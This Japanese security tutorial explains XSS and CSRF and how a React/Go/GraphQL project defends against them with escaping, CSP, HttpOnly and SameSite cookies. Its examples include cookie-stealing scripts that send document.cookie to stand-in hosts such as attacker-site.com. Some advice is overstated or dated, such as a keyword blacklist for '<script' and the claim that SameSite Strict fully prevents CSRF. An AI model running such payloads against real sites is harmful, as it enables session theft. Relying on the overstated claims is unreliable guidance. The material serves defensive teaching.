# XSS対策・セキュリティ実装解説資料
*クロスサイトスクリプティング攻撃とプロジェクトでの防御戦略*

## 🎯 この資料の目的

XSS（クロスサイトスクリプティング）攻撃とは何か、そしてあなたのプロジェクトでどのようにセキュリティ対策が実装されているかを分かりやすく解説します。

---

## 1. XSS（クロスサイトスクリプティング）とは何か

### 1.1 XSS攻撃の基本的な仕組み

XSSは、悪意のあるJavaScriptコードをWebサイトに注入して、他のユーザーの情報を盗む攻撃手法です。

```mermaid
sequenceDiagram
    participant Attacker as 🔴 攻撃者
    participant Website as 🌐 Webサイト
    participant Victim as 👤 被害者
    participant Cookie as 🍪 認証Cookie
    
    Attacker->>Website: 悪意のあるスクリプトを投稿
    Website->>Website: スクリプトをデータベースに保存
    Victim->>Website: 普通にサイトにアクセス
    Website->>Victim: 悪意のあるスクリプトを含むページを表示
    Victim->>Cookie: スクリプトがCookieを読み取り
    Cookie-->>Attacker: 認証情報が攻撃者に送信される
    Attacker->>Website: 被害者になりすましてログイン
```

### 1.2 具体的なXSS攻撃例

**① コメント投稿での攻撃例**:
```html
<!-- 攻撃者が投稿するコメント -->
ありがとうございます！
<script>
  // 悪意のあるコード
  var cookies = document.cookie;
  fetch('https://attacker-site.com/steal', {
    method: 'POST',
    body: cookies  // 認証Cookieを攻撃者のサーバーに送信
  });
</script>
```

**② URLパラメータでの攻撃例**:
```html
<!-- 攻撃者が送るリンク -->
https://yoursite.com/search?q=<script>alert('XSS攻撃成功')</script>

<!-- サイトが適切にエスケープしていない場合 -->
<p>検索結果: <script>alert('XSS攻撃成功')</script></p>
```

### 1.3 XSS攻撃の3つのタイプ

```mermaid
mindmap
  root((XSS攻撃))
    反射型XSS
      URL内のスクリプト
      即座に実行
      一回限りの攻撃
    蓄積型XSS
      データベース保存
      継続的な攻撃
      より危険
    DOM型XSS
      ブラウザ内で発生
      サーバーを経由しない
      検出が困難
```

---

## 2. あなたのプロジェクトでのXSS対策

### 2.1 多層防御によるセキュリティアーキテクチャ

```mermaid
graph TB
    subgraph "第1層: データ入力・検証"
        INPUT[ユーザー入力]
        VALIDATION[入力値検証<br/>特殊文字チェック]
        SANITIZE[サニタイゼーション<br/>危険なコード除去]
    end
    
    subgraph "第2層: データ表示・エスケープ"
        ESCAPE[HTMLエスケープ<br/>< → &lt; など]
        CSP[Content Security Policy<br/>スクリプト実行制限]
    end
    
    subgraph "第3層: 認証トークン保護"
        HTTPONLY[HttpOnly Cookie<br/>JavaScript非アクセス]
        SECURE[Secure Cookie<br/>HTTPS必須]
        SAMESITE[SameSite設定<br/>CSRF攻撃防止]
    end
    
    subgraph "第4層: ネットワークセキュリティ"
        HTTPS[HTTPS通信<br/>暗号化]
        CORS[CORS設定<br/>不正アクセス防止]
    end
    
    INPUT --> VALIDATION
    VALIDATION --> SANITIZE
    SANITIZE --> ESCAPE
    ESCAPE --> CSP
    CSP --> HTTPONLY
    HTTPONLY --> SECURE
    SECURE --> SAMESITE
    SAMESITE --> HTTPS
    HTTPS --> CORS
```

### 2.2 プロジェクト内での具体的な実装箇所

#### 🎨 **フロントエンド (React) でのXSS対策**

**React標準のXSS防止機能**:
```typescript
// LoginPage.tsx - 安全なデータ表示
function LoginPage() {
  const [username, setUsername] = useState('');
  
  return (
    <div>
      {/* Reactが自動的にHTMLエスケープ */}
      <p>ようこそ、{username}さん</p>  
      
      {/* 危険: 生のHTMLを挿入（使用していない） */}
      {/* <div dangerouslySetInnerHTML={{__html: userInput}} /> */}
    </div>
  );
}
```

**Material UIの安全な入力コンポーネント**:
```typescript
// 安全な入力フィールド
<TextField
  value={username}
  onChange={(e) => setUsername(e.target.value)}
  // Material UIが自動的に入力値をサニタイズ
/>
```

#### ⚙️ **バックエンド (Go) でのXSS対策**

**入力値検証の実装**:
```go
// ユーザー入力の検証
func validateUserInput(input string) error {
    // HTMLタグの検出
    if strings.Contains(input, "<script") || strings.Contains(input, "javascript:") {
        return errors.New("不正な文字が含まれています")
    }
    
    // 長さ制限
    if len(input) > 255 {
        return errors.New("入力値が長すぎます")
    }
    
    return nil
}
```

**安全なHTTPレスポンス設定**:
```go
// セキュリティヘッダーの設定
func setSecurityHeaders(w http.ResponseWriter) {
    // XSS Protection
    w.Header().Set("X-XSS-Protection", "1; mode=block")
    
    // Content Type Sniffing防止
    w.Header().Set("X-Content-Type-Options", "nosniff")
    
    // Frame Options (Clickjacking防止)
    w.Header().Set("X-Frame-Options", "DENY")
    
    // Content Security Policy
    w.Header().Set("Content-Security-Policy", 
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'")
}
```

#### 🔐 **Cookie セキュリティの実装**

**HttpOnly Cookie設定**:
```go
// JWT認証でのセキュアCookie設定
http.SetCookie(w, &http.Cookie{
    Name:     "auth_token",
    Value:    jwtToken,
    HttpOnly: true,                    // ✅ JavaScript非アクセス
    Secure:   true,                    // ✅ HTTPS必須
    SameSite: http.SameSiteStrictMode, // ✅ CSRF攻撃防止
    Path:     "/",
    Expires:  time.Now().Add(15 * time.Minute),
})
```

---

## 3. HttpOnly Cookie の重要性

### 3.1 通常のCookie vs HttpOnly Cookie

```mermaid
graph TB
    subgraph "通常のCookie（危険）"
        NORMAL_COOKIE[通常のCookie]
        JS_ACCESS[JavaScript読み取り可能]
        XSS_VULNERABLE[XSS攻撃で盗める]
    end
    
    subgraph "HttpOnly Cookie（安全）"
        HTTPONLY_COOKIE[HttpOnly Cookie]
        JS_BLOCKED[JavaScript読み取り不可]
        XSS_PROTECTED[XSS攻撃から保護]
    end
    
    NORMAL_COOKIE --> JS_ACCESS
    JS_ACCESS --> XSS_VULNERABLE
    
    HTTPONLY_COOKIE --> JS_BLOCKED
    JS_BLOCKED --> XSS_PROTECTED
```

### 3.2 JavaScriptアクセステスト

**通常のCookieの場合（危険）**:
```javascript
// ブラウザのコンソールで実行可能
console.log(document.cookie);
// 結果: "auth_token=eyJhbGciOiJIUzI1NiIsInR..." ←盗める！
```

**HttpOnly Cookieの場合（安全）**:
```javascript
// ブラウザのコンソールで実行
console.log(document.cookie);
// 結果: "other_cookie=value" ←HttpOnly Cookieは表示されない！
```

### 3.3 攻撃シナリオとその防御

**🔴 攻撃シナリオ: XSS経由でのCookie盗難**
```html
<!-- 悪意のあるスクリプトが実行された場合 -->
<script>
// 通常のCookieなら盗める
var stolenCookie = document.cookie;
fetch('https://attacker.com/steal', {
  method: 'POST', 
  body: stolenCookie
});
</script>
```

**🛡️ 防御結果: HttpOnly Cookieでの保護**
```javascript
// HttpOnly Cookieは読み取れない
var cookies = document.cookie;  // auth_tokenは含まれない
// 攻撃者は認証トークンを盗めない！
```

---

## 4. SameSite設定によるCSRF攻撃防止

### 4.1 CSRF攻撃とは

CSRF（Cross-Site Request Forgery）は、ユーザーが気づかないうちに意図しない操作を実行させる攻撃です。

```mermaid
sequenceDiagram
    participant User as 👤 ユーザー
    participant Bank as 🏦 銀行サイト
    participant Evil as 🔴 悪意のサイト
    
    User->>Bank: ログイン（認証Cookie保存）
    User->>Evil: 悪意のサイトにアクセス
    Evil->>User: 隠された送金フォームを表示
    User->>Bank: 無意識に送金リクエスト（Cookie自動送信）
    Bank->>Bank: 認証Cookie有効なので送金実行
    Bank-->>Evil: 攻撃成功
```

### 4.2 SameSite設定による防御

```go
// SameSite設定の種類と効果
http.SetCookie(w, &http.Cookie{
    SameSite: http.SameSiteStrictMode,  // 最も厳格
    // 他のサイトからのリクエストでCookie送信しない
})

http.SetCookie(w, &http.Cookie{
    SameSite: http.SameSiteLaxMode,     // 中程度
    // GET以外（POST等）で他サイトからのCookie送信しない
})

http.SetCookie(w, &http.Cookie{
    SameSite: http.SameSiteNoneMode,    // 制限なし（危険）
    // 他のサイトからでもCookie送信（非推奨）
})
```

### 4.3 プロジェクトでのSameSite Strict実装効果

```mermaid
graph TB
    subgraph "外部サイトからの攻撃"
        EVIL_SITE[悪意のサイト]
        ATTACK_FORM[偽装フォーム]
        CSRF_REQUEST[CSRF攻撃リクエスト]
    end
    
    subgraph "あなたのサイト"
        YOUR_SITE[プロジェクトサイト]
        SAMESITE_CHECK[SameSite Strict確認]
        BLOCK_REQUEST[リクエスト拒否]
    end
    
    EVIL_SITE --> ATTACK_FORM
    ATTACK_FORM --> CSRF_REQUEST
    CSRF_REQUEST --> SAMESITE_CHECK
    SAMESITE_CHECK --> BLOCK_REQUEST
    
    style BLOCK_REQUEST fill:#ff9999
```

---

## 5. Content Security Policy (CSP) による追加防御

### 5.1 CSPの役割

CSPは、実行可能なスクリプトのソースを制限することで、XSS攻撃を防ぐHTTPヘッダーです。

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

### 5.2 CSP設定の詳細解説

```mermaid
mindmap
  root((CSP設定))
    default-src 'self'
      自サイトのリソースのみ許可
      外部サイトからの読み込み禁止
    script-src 'self'
      JavaScriptは自サイトのみ
      インラインスクリプト禁止
      外部スクリプト禁止
    style-src 'self' 'unsafe-inline'
      CSSは自サイト + インライン許可
      Material UIのスタイル対応
    img-src 'self'
      画像は自サイトのみ
      外部画像の禁止
```

### 5.3 CSPが防ぐ攻撃例

**🔴 攻撃: 外部スクリプト注入**
```html
<!-- 攻撃者が注入しようとするコード -->
<script src="https://attacker.com/malicious.js"></script>
```

**🛡️ 防御: CSPによるブロック**
```
ブラウザコンソール:
Blocked script execution from 'https://attacker.com/malicious.js' 
because it violates the Content Security Policy directive: "script-src 'self'"
```

---

## 6. GraphQL特有のセキュリティ対策

### 6.1 GraphQLでの認証ディレクティブ

```graphql
# セキュアなGraphQLスキーマ設計
directive @auth on FIELD_DEFINITION
directive @hasRole(role: String!) on FIELD_DEFINITION

type Mutation {
  # 認証必須の操作
  createTestSuite(input: CreateTestSuiteInput!): TestSuite! @auth
  
  # 管理者のみアクセス可能
  deleteUser(userId: ID!): Boolean! @hasRole(role: "Admin")
}
```

### 6.2 GraphQLクエリ検証

```go
// GraphQLリゾルバーでの入力検証
func (r *mutationResolver) CreateTestSuite(ctx context.Context, input CreateTestSuiteInput) (*TestSuite, error) {
    // 1. 認証確認（@authディレクティブで自動実行）
    user := auth.GetUserFromContext(ctx)
    if user == nil {
        return nil, errors.New("認証が必要です")
    }
    
    // 2. 入力値検証
    if err := validateTestSuiteInput(input); err != nil {
        return nil, err
    }
    
    // 3. 権限確認
    if !user.CanCreateTestSuite() {
        return nil, errors.New("テストスイート作成権限がありません")
    }
    
    // 4. 安全な処理実行
    return r.testSuiteInteractor.Create(ctx, input)
}
```

---

## 7. HTTPS通信による暗号化

### 7.1 プロジェクトでのHTTPS実装

```mermaid
graph TB
    subgraph "本番環境でのHTTPS"
        BROWSER[ブラウザ]
        CF[CloudFront<br/>SSL終端]
        ALB[Application Load Balancer<br/>内部通信]
        ECS[ECS Container<br/>アプリケーション]
    end
    
    BROWSER -->|HTTPS| CF
    CF -->|HTTPS| ALB  
    ALB -->|HTTP| ECS
    
    style CF fill:#e8f5e8
    style ALB fill:#e8f5e8
```

### 7.2 SSL/TLS証明書の自動管理

```terraform
# AWS Certificate Manager での証明書取得
resource "aws_acm_certificate" "main" {
  domain_name       = "example-graphql-api.com"
  validation_method = "DNS"
  
  lifecycle {
    create_before_destroy = true
  }
}

# Route53 での自動検証
resource "aws_route53_record" "cert_validation" {
  for_each = {
    for dvo in aws_acm_certificate.main.domain_validation_options : dvo.domain_name => {
      name   = dvo.resource_record_name
      record = dvo.resource_record_value
      type   = dvo.resource_record_type
    }
  }
  
  name    = each.value.name
  type    = each.value.type
  zone_id = data.aws_route53_zone.main.zone_id
  records = [each.value.record]
  ttl     = 60
}
```

---

## 8. セキュリティ対策の効果確認

### 8.1 実際の環境での確認方法

**🌐 ブラウザでのセキュリティ確認**:

1. **開発者ツールでのCookie確認**:
   ```
   F12 → Application → Cookies → あなたのサイトURL
   auth_token の属性確認:
   ✅ HttpOnly: true
   ✅ Secure: true  
   ✅ SameSite: Strict
   ```

2. **ネットワークタブでのヘッダー確認**:
   ```
   F12 → Network → リクエスト選択 → Response Headers
   ✅ X-XSS-Protection: 1; mode=block
   ✅ X-Content-Type-Options: nosniff
   ✅ Content-Security-Policy: ...
   ```

3. **HTTPS証明書の確認**:
   ```
   ブラウザのアドレスバーの鍵アイコンクリック
   ✅ 証明書の有効性確認
   ✅ 暗号化強度確認
   ```

### 8.2 セキュリティテストの実施

**JavaScriptコンソールでのテスト**:
```javascript
// XSS攻撃テスト（安全確認）
console.log(document.cookie);
// HttpOnly Cookieは表示されないことを確認

// CSPテスト（ブロック確認）
var script = document.createElement('script');
script.src = 'https://evil-site.com/malicious.js';
document.head.appendChild(script);
// CSPによってブロックされることを確認
```

---

## 9. セキュリティ対策の重複効果

### 9.1 多層防御による安全性

```mermaid
flowchart TD
    ATTACK[🔴 XSS攻撃発生] --> LAYER1{第1層: 入力検証}
    LAYER1 -->|通過| LAYER2{第2層: HTMLエスケープ}
    LAYER2 -->|通過| LAYER3{第3層: CSP}
    LAYER3 -->|通過| LAYER4{第4層: HttpOnly Cookie}
    
    LAYER1 -->|ブロック| SAFE1[✅ 攻撃防止]
    LAYER2 -->|ブロック| SAFE2[✅ 攻撃防止]
    LAYER3 -->|ブロック| SAFE3[✅ 攻撃防止]
    LAYER4 -->|ブロック| SAFE4[✅ 攻撃防止]
    
    style SAFE1 fill:#e8f5e8
    style SAFE2 fill:#e8f5e8
    style SAFE3 fill:#e8f5e8
    style SAFE4 fill:#e8f5e8
```

### 9.2 各防御層の役割

| 防御層 | 対策内容 | 効果 | 実装箇所 |
|-------|----------|------|----------|
| **第1層** | 入力値検証 | 悪意のコード注入防止 | バックエンド検証 |
| **第2層** | HTMLエスケープ | スクリプト実行防止 | React自動処理 |
| **第3層** | CSP | 外部スクリプト阻止 | HTTPヘッダー |
| **第4層** | HttpOnly Cookie | トークン盗難防止 | Cookie設定 |

---

## 10. よくある質問と回答

### Q1. なぜXSS対策が重要なのか？

**A**: 以下の被害を防ぐためです：
- **認証情報盗難**: ログイン状態を乗っ取られる
- **個人情報漏洩**: 機密データが外部に送信される
- **なりすまし**: 被害者の名前で不正操作実行
- **フィッシング**: 偽のログイン画面で認証情報を盗む

### Q2. ReactはXSS対策が自動的にされるのか？

**A**: 基本的には安全ですが注意点があります：
- ✅ **安全**: `{username}` などの変数表示は自動エスケープ
- ⚠️ **危険**: `dangerouslySetInnerHTML` は手動対策が必要
- ✅ **安全**: Material UIコンポーネントは基本的に安全
- ⚠️ **注意**: 外部ライブラリは個別確認が必要

### Q3. HttpOnly Cookieにするとどんな制限がある？

**A**: JavaScriptでの操作に制限があります：
- ❌ **制限**: `document.cookie` での読み書き不可
- ✅ **可能**: HTTP通信での自動送信
- ✅ **利点**: XSS攻撃からの保護
- 💡 **対応**: Apollo Client等のライブラリが自動処理

### Q4. SameSite Strictは厳しすぎないか？

**A**: セキュリティと利便性のバランスです：
- 🛡️ **利点**: CSRF攻撃を完全防止
- ⚠️ **制限**: 外部サイトからのリンクでもCookie送信されない
- 💡 **対応**: ログインページへのリダイレクトで解決
- ✅ **結果**: セキュリティ向上 > 小さな不便

---

## 11. まとめ: プロジェクトのセキュリティ価値

### 11.1 実装済みセキュリティ対策

✅ **XSS対策**:
- React自動エスケープ + 入力値検証
- CSP設定 + セキュリティヘッダー
- HttpOnly Cookie実装

✅ **CSRF対策**:
- SameSite Strict設定
- CSRFトークン（必要に応じて拡張可能）

✅ **通信セキュリティ**:
- HTTPS完全対応（証明書自動管理）
- セキュアCookie設定

✅ **認証セキュリティ**:
- JWT + 短期有効期限
- リフレッシュトークン機能

### 11.2 エンタープライズレベルのセキュリティ

**🏆 業界標準対応**:
- OWASP Top 10セキュリティ項目への対応
- 金融機関レベルのセキュリティ設計
- AWS WAF対応準備済み（将来拡張）

**🏆 継続的セキュリティ**:
- 自動証明書更新
- セキュリティヘッダー標準化
- 監査ログ対応（拡張可能）

### 11.3 学習・実践価値

**💡 Webセキュリティの実践的理解**:
- XSS/CSRF攻撃メカニズムの把握
- 多層防御アーキテクチャの実装
- 現代的セキュリティベストプラクティスの習得

**💡 実用的セキュリティスキル**:
- Cookie設定による認証保護
- HTTPSとCSPによる通信保護  
- GraphQL認証の宣言的実装

---

**🔐 重要なポイント**: あなたのプロジェクトは、現代的Webアプリケーションに必要なセキュリティ対策を包括的に実装しており、実際の業務でも通用するエンタープライズレベルのセキュリティ設計になっています。